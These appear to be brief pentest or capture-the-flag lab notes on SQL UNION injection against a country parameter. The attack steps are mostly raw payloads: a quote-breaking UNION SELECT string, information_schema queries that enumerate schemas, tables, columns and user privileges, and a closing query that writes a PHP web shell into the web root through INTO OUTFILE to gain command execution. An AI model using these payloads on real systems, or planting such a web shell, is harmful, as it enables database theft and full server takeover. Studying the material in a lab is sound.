_____
# Union Injection

```bash
username=test&country=Brazil'
```

![[Pasted image 20240415185635.png]]

```
SELECT username from players where country = '[input]';
```

A UNION injection is when I add a UNION statement to the query allowing me to make a new query and append the results to the intended query. I’ll need to match the same number of columns, or the query will error. I’ll start with `Brazil' UNION SELECT 1;-- -`. That would make the query:

```
SELECT username from players where country = 'Brazil' UNION SELECT 1;-- -';
```

We see the page no longer displays an error,
which tells us the SQL Query is returning only one column
## Enumerate DB

```sql
select schema_name from information_schema.schemata
```

```sql
select table_name from information_schema.tables where table_schema = 'registration'
```

```sql
select column_name from information_schema.columns where table_name = 'registration'
```

```sql
select privilege_type FROM information_schema.user_privileges where grantee = "'uhc'@'localhost'"
```

### File write

```sql
select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/shell.php'
```




